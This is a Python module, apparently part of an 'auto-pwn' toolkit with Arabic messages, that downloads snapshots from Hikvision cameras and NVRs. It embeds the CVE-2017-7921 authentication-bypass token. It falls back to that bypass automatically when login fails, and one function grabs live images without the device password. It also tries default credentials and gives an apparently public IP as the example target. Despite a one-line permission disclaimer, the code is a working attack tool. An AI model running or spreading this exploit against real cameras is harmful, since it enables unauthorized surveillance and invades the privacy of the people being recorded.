#!/usr/bin/env python3
"""
وحدة مشتركة: لقطات Hikvision عبر ISAPI.

يُستدعى من:
  - test.py (جذر المستودع)
  - auto-pwn/modules/camera_viewer.py
  - auto-pwn/main.py عند اكتشاف Hikvision

الاستخدام على أجهزتك أو بإذن صريح فقط.
"""

from __future__ import annotations

import argparse
import hashlib
import ipaddress
import os
import re
import sys
import xml.etree.ElementTree as ET
from dataclasses import dataclass
from pathlib import Path

import requests
import urllib3
from requests.auth import HTTPDigestAuth
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)

DEFAULT_USER = "admin"
DEFAULT_PASSWORD = "12345"
DEFAULT_MAX_CHANNELS = 24
HIKVISION_BACKDOOR_AUTH = "YWRtaW46MTEK"  # admin:11 — CVE-2017-7921
HIKVISION_BACKDOOR_CREDS = ("admin", "11")

DISCOVERY_PATHS = (
    "/ISAPI/System/Video/inputs/channels",
    "/ISAPI/ContentMgmt/InputProxy/channels",
    "/ISAPI/Streaming/channels",
)


@dataclass
class StreamInfo:
    stream_id: int
    name: str
    video_input_id: int
    enabled: bool


@dataclass
class DeviceInfo:
    device_type: str
    model: str
    device_name: str


# نصوص توضيحية شائعة — ليست عناوين IP حقيقية
_PLACEHOLDER_HINTS = (
    "عنوان",
    "address",
    "your_",
    "example",
    "xxx",
    "nvr_ip",
    "ip_here",
)

_PROBE_PORTS = (80, 443, 8000, 8080, 554)


def validate_host(host: str) -> str | None:
    """رسالة خطأ إن كان -H غير صالح، وإلا None."""
    h = host.strip()
    if not h:
        return "العنوان فارغ"
    lower = h.lower()
    if any(x in lower for x in _PLACEHOLDER_HINTS) and not re.fullmatch(r"[\d.]+", h):
        return (
            f"«{h}» يبدو نصاً توضيحياً وليس IP.\n"
            "    استبدله بعنوان حقيقي، مثال: -H 1.178.133.180"
        )
    try:
        ipaddress.ip_address(h)
        return None
    except ValueError:
        pass
    if re.fullmatch(r"[\w.\-]+", h):
        return None
    return f"عنوان غير صالح: {h!r}"


def hikvision_digest_auth(username: str, password: str) -> HTTPDigestAuth:
    """Hikvision ISAPI uses HTTP Digest — not Basic."""
    return HTTPDigestAuth(username, password)


def _isapi_request(
    session: requests.Session,
    url: str,
    auth: tuple[str, str],
    timeout: float,
    *,
    use_backdoor: bool = False,
) -> requests.Response | None:
    try:
        if use_backdoor:
            sep = "&" if "?" in url else "?"
            url = f"{url}{sep}auth={HIKVISION_BACKDOOR_AUTH}"
            return session.get(url, timeout=timeout, verify=False)
        return session.get(url, auth=hikvision_digest_auth(auth[0], auth[1]), timeout=timeout, verify=False)
    except requests.RequestException:
        return None


def find_isapi_base(
    host: str,
    auth: tuple[str, str],
    *,
    port_hint: int,
    https: bool,
    timeout: float,
) -> tuple[str | None, str, bool]:
    """Return (base_url, message, use_backdoor)."""
    session = requests.Session()
    tried: list[str] = []
    ports: list[int] = []
    if port_hint:
        ports.append(port_hint)
    for p in _PROBE_PORTS:
        if p not in ports:
            ports.append(p)

    for use_backdoor in (False, True):
        for port in ports:
            schemes = [True] if (https or port == 443) else []
            if port != 443 or not schemes:
                schemes.append(False)
            for use_https in schemes:
                base = _base_url(host, port, use_https)
                url = f"{base}/ISAPI/System/DeviceInfo"
                if not use_backdoor:
                    if url in tried:
                        continue
                    tried.append(url)
                response = _isapi_request(session, url, auth, timeout, use_backdoor=use_backdoor)
                if response is None:
                    continue
                if response.status_code == 200:
                    if use_backdoor:
                        return base, f"ISAPI via CVE-2017-7921 backdoor on {base}", True
                    return base, f"اتصال ناجح على {base}", False
                if response.status_code == 401 and not use_backdoor:
                    continue
                if response.status_code == 404:
                    continue

    return None, (
        "لم يُعثر على ISAPI Hikvision على المنافذ المجرّبة.\n"
        f"    عناوين مُجرَّبة: {', '.join(tried[:6])}{'...' if len(tried) > 6 else ''}\n"
        "    تأكد من IP الـ NVR، وفتح المنفذ 80/8000، وأن الجهاز Hikvision."
    ), False



def _base_url(host: str, port: int, https: bool) -> str:
    scheme = "https" if https else "http"
    if (https and port == 443) or (not https and port == 80):
        return f"{scheme}://{host}"
    return f"{scheme}://{host}:{port}"


def _local_tag(tag: str) -> str:
    return tag.rsplit("}", 1)[-1] if "}" in tag else tag


def _get_xml(
    session: requests.Session,
    base: str,
    path: str,
    auth: tuple[str, str],
    timeout: float,
    *,
    use_backdoor: bool = False,
) -> str | None:
    response = _isapi_request(session, f"{base}{path}", auth, timeout, use_backdoor=use_backdoor)
    if response is not None and response.status_code == 200 and response.text.strip():
        return response.text
    return None


def fetch_device_info(
    session: requests.Session,
    base: str,
    auth: tuple[str, str],
    timeout: float,
    *,
    use_backdoor: bool = False,
) -> DeviceInfo | None:
    xml = _get_xml(session, base, "/ISAPI/System/DeviceInfo", auth, timeout, use_backdoor=use_backdoor)
    if not xml:
        return None

    def _field(name: str) -> str:
        m = re.search(rf"<{name}>([^<]*)</{name}>", xml)
        return m.group(1).strip() if m else ""

    return DeviceInfo(
        device_type=_field("deviceType") or "unknown",
        model=_field("model") or "",
        device_name=_field("deviceName") or "",
    )


def parse_video_input_channels(xml_text: str) -> list[tuple[int, str]]:
    """قنوات الإدخال الفعلية: (id, name)."""
    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return []

    channels: list[tuple[int, str]] = []
    for block in root.iter():
        if _local_tag(block.tag) != "VideoInputChannel":
            continue
        cid: int | None = None
        name = ""
        for child in block:
            t = _local_tag(child.tag)
            if t == "id" and child.text and child.text.isdigit():
                cid = int(child.text)
            elif t == "name" and child.text:
                name = child.text.strip()
        if cid is not None:
            channels.append((cid, name))
    return channels


def parse_streaming_channels(xml_text: str) -> list[StreamInfo]:
    """كل بث مسجّل في ISAPI (101، 102، …)."""
    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return []

    streams: list[StreamInfo] = []
    for block in root.iter():
        if _local_tag(block.tag) != "StreamingChannel":
            continue
        sid: int | None = None
        name = ""
        vin = 0
        enabled = True
        for child in block:
            t = _local_tag(child.tag)
            if t == "id" and child.text and child.text.isdigit():
                sid = int(child.text)
            elif t == "channelName" and child.text:
                name = child.text.strip()
            elif t == "enabled" and child.text:
                enabled = child.text.strip().lower() == "true"
            elif t == "videoInputChannelID" and child.text and child.text.isdigit():
                vin = int(child.text)
        if sid is not None:
            streams.append(StreamInfo(sid, name, vin, enabled))
    return streams


def pick_snapshot_stream_ids(streams: list[StreamInfo]) -> list[StreamInfo]:
    """
    لقطة واحدة لكل مدخل فيديو: البث الرئيسي (…01) إن وُجد.
    """
    enabled = [s for s in streams if s.enabled]
    if not enabled:
        enabled = streams

    by_input: dict[int, list[StreamInfo]] = {}
    for s in enabled:
        key = s.video_input_id or (s.stream_id // 100)
        by_input.setdefault(key, []).append(s)

    picked: list[StreamInfo] = []
    for key in sorted(by_input):
        group = sorted(by_input[key], key=lambda x: x.stream_id)
        main = next((s for s in group if s.stream_id % 100 == 1), group[0])
        picked.append(main)
    return picked


@dataclass
class SnapshotResult:
    data: bytes | None
    error: str | None = None


def probe_snapshot(
    session: requests.Session,
    base: str,
    stream_id: int,
    auth: tuple[str, str],
    timeout: float,
    *,
    use_backdoor: bool = False,
) -> SnapshotResult:
    url = f"{base}/ISAPI/Streaming/channels/{stream_id}/picture"
    response = _isapi_request(session, url, auth, timeout, use_backdoor=use_backdoor)
    if response is None:
        return SnapshotResult(None, "connection error")
    if response.status_code == 401:
        return SnapshotResult(None, "401 Unauthorized")
    if response.status_code == 404:
        return SnapshotResult(None, "404")
    if response.status_code == 200 and response.content and len(response.content) > 500:
        if response.content[:2] == b"\xff\xd8" or "image" in (response.headers.get("Content-Type") or "").lower():
            return SnapshotResult(response.content)
    return SnapshotResult(None, f"HTTP {response.status_code}")


def content_fingerprint(data: bytes) -> str:
    """بصمة تقريبية: تجاهل أول/آخر جزء (غالباً الطابع الزمني يتغير)."""
    n = len(data)
    if n < 4096:
        return hashlib.md5(data).hexdigest()
    mid = data[n // 4 : 3 * n // 4]
    return hashlib.md5(mid).hexdigest()


def discover_streams(
    session: requests.Session,
    base: str,
    auth: tuple[str, str],
    timeout: float,
    *,
    use_backdoor: bool = False,
) -> tuple[list[StreamInfo], list[tuple[int, str]], DeviceInfo | None]:
    dev = fetch_device_info(session, base, auth, timeout, use_backdoor=use_backdoor)
    inputs: list[tuple[int, str]] = []
    xml_in = _get_xml(session, base, "/ISAPI/System/Video/inputs/channels", auth, timeout, use_backdoor=use_backdoor)
    if xml_in:
        inputs = parse_video_input_channels(xml_in)

    streams: list[StreamInfo] = []
    xml_st = _get_xml(session, base, "/ISAPI/Streaming/channels", auth, timeout, use_backdoor=use_backdoor)
    if xml_st:
        streams = parse_streaming_channels(xml_st)

    if not streams:
        for path in DISCOVERY_PATHS[1:]:
            xml = _get_xml(session, base, path, auth, timeout, use_backdoor=use_backdoor)
            if xml:
                streams = parse_streaming_channels(xml)
                if streams:
                    break

    return streams, inputs, dev


def download_all_snapshots(
    host: str,
    username: str,
    password: str,
    *,
    port: int = 80,
    https: bool = False,
    max_channels: int = DEFAULT_MAX_CHANNELS,
    output_dir: str = "snapshots",
    timeout: float = 15.0,
    force_scan: bool = False,
) -> list[Path]:
    host_err = validate_host(host)
    if host_err:
        print(f"[X] {host_err}")
        return []

    auth = (username, password)
    base, conn_msg, use_backdoor = find_isapi_base(host, auth, port_hint=port, https=https, timeout=timeout)
    if not base:
        print(f"[X] {conn_msg}")
        return []
    print(f"[*] {conn_msg}\n")

    session = requests.Session()
    session.headers["User-Agent"] = "hikvision-snapshot/2.0"

    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)

    streams, inputs, dev = discover_streams(session, base, auth, timeout, use_backdoor=use_backdoor)

    if dev:
        print(f"[*] الجهاز: {dev.device_name} | النوع: {dev.device_type} | الطراز: {dev.model}")
    if inputs:
        print("[*] مداخل فيديو فعلية من ISAPI:")
        for cid, name in inputs:
            print(f"    - قناة {cid}: {name or '(بدون اسم)'}")
    else:
        print("[*] لم تُقرأ قائمة مداخل الفيديو")

    is_single_ipcam = (
        dev
        and dev.device_type.upper() == "IPCAMERA"
        and len(inputs) <= 1
        and len(pick_snapshot_stream_ids(streams)) <= 2
    )

    if is_single_ipcam and not force_scan:
        print(
            "\n[!] هذا عنوان **كاميرا IP واحدة** وليس DVR بـ 24 كاميرا.\n"
            "    طلب /channels/201/picture … /2401/picture يعيد غالباً **نفس المشهد** (مع طابع زمني مختلف).\n"
            "    الشبكة على شاشة الاستقبال تأتي من **مسجّل NVR آخر** — استخدم IP الـ NVR مع -H.\n"
        )
        to_fetch = pick_snapshot_stream_ids(streams)
    elif force_scan:
        print(f"[*] مسح يدوي 1..{max_channels} (force-scan)")
        to_fetch = [
            StreamInfo(n * 100 + 1, f"scan-{n}", n, True) for n in range(1, max_channels + 1)
        ]
    else:
        to_fetch = pick_snapshot_stream_ids(streams)
        if not to_fetch:
            print(f"[*] لا بثوث في ISAPI؛ تجربة 1..{max_channels}")
            to_fetch = [
                StreamInfo(n * 100 + 1, f"scan-{n}", n, True) for n in range(1, max_channels + 1)
            ]

    print(f"[*] جلب لقطات لـ {len(to_fetch)} بث/مدخل (وليس 24 تلقائياً على كاميرا واحدة)\n")

    saved: list[Path] = []
    seen_fp: dict[str, int] = {}

    first_err: str | None = None
    for s in to_fetch:
        res = probe_snapshot(session, base, s.stream_id, auth, timeout, use_backdoor=use_backdoor)
        if res.data is None:
            err = res.error or "فشل"
            if first_err is None:
                first_err = err
            print(f"[-] stream {s.stream_id} ({s.name}) — {err}")
            continue

        data = res.data
        fp = content_fingerprint(data)
        if fp in seen_fp:
            dup_of = seen_fp[fp]
            print(
                f"[~] stream {s.stream_id} ({s.name}) — **نفس مشهد** stream {dup_of} (تخطي حفظ مكرر)"
            )
            continue

        seen_fp[fp] = s.stream_id
        vin = s.video_input_id or (s.stream_id // 100)
        safe_name = re.sub(r"[^\w\-]+", "_", s.name or f"input{vin}")[:40]
        path = out / f"input_{vin:02d}_stream_{s.stream_id}_{safe_name}.jpg"
        path.write_bytes(data)
        saved.append(path)
        print(f"[+] مدخل {vin} | stream {s.stream_id} | {s.name} -> {path.name}")

    print()
    unique = len(saved)
    print(f"[=] كاميرات/مشاهد **فريدة**: {unique} صورة في {out.resolve()}")
    if unique == 0 and first_err:
        print(f"[!] سبب محتمل لكل الفشل: {first_err}")
    if unique <= 1 and is_single_ipcam:
        print("[=] للحصول على باقي الكاميرات: شغّل السكربت مع IP جهاز الـ NVR/DVR، مثال: -H 1.178.133.180")
    return saved


def download_backdoor_snapshots(
    host: str,
    output_dir: str,
    *,
    port: int = 80,
    max_channels: int = 8,
    timeout: float = 15.0,
) -> list[Path]:
    """
    Snapshots via CVE-2017-7921 bypass — works without knowing the real password.
    The backdoor token (admin:11) is NOT the device's actual login password.
    """
    session = requests.Session()
    session.headers["User-Agent"] = "hikvision-snapshot/2.0"
    base = _base_url(host, port, False)
    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    saved: list[Path] = []

    main_url = f"{base}/onvif-http/snapshot?auth={HIKVISION_BACKDOOR_AUTH}"
    try:
        r = session.get(main_url, timeout=timeout, verify=False)
        if r.status_code == 200 and len(r.content) > 500:
            path = out / "backdoor_live_snapshot.jpg"
            path.write_bytes(r.content)
            saved.append(path)
            print(f"[+] Backdoor snapshot -> {path.name}")
    except requests.RequestException:
        pass

    auth = HIKVISION_BACKDOOR_CREDS
    for ch in range(1, max_channels + 1):
        stream_id = ch * 100 + 1
        res = probe_snapshot(session, base, stream_id, auth, timeout, use_backdoor=True)
        if res.data is None:
            if ch == 1:
                continue
            break
        path = out / f"backdoor_ch{ch}_stream{stream_id}.jpg"
        path.write_bytes(res.data)
        saved.append(path)
        print(f"[+] Backdoor channel {ch} -> {path.name}")

    return saved


def main() -> int:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")

    p = argparse.ArgumentParser(description="Hikvision snapshots — real channels only")
    p.add_argument("-H", "--host", default=os.environ.get("CAM_HOST", "192.168.1.100"))
    p.add_argument("-u", "--user", default=os.environ.get("CAM_USER", DEFAULT_USER))
    p.add_argument("-p", "--password", default=os.environ.get("CAM_PASS", DEFAULT_PASSWORD))
    p.add_argument("--port", type=int, default=int(os.environ.get("CAM_PORT", "80")))
    p.add_argument("--https", action="store_true")
    p.add_argument("--max-channels", type=int, default=DEFAULT_MAX_CHANNELS)
    p.add_argument(
        "--force-scan",
        action="store_true",
        help="إجبار مسح 101..N01 حتى على كاميرا IP (غالباً صور مكررة)",
    )
    p.add_argument("-o", "--output", default="snapshots")
    p.add_argument("--timeout", type=float, default=15.0)
    args = p.parse_args()

    err = validate_host(args.host)
    if err:
        print(f"[X] {err}", file=sys.stderr)
        return 2

    print(f"[*] الهدف: {args.host} | auth=({args.user}, ***)\n")
    saved = download_all_snapshots(
        args.host,
        args.user,
        args.password,
        port=args.port,
        https=args.https,
        max_channels=args.max_channels,
        output_dir=args.output,
        timeout=args.timeout,
        force_scan=args.force_scan,
    )
    return 0 if saved else 1


if __name__ == "__main__":
    raise SystemExit(main())
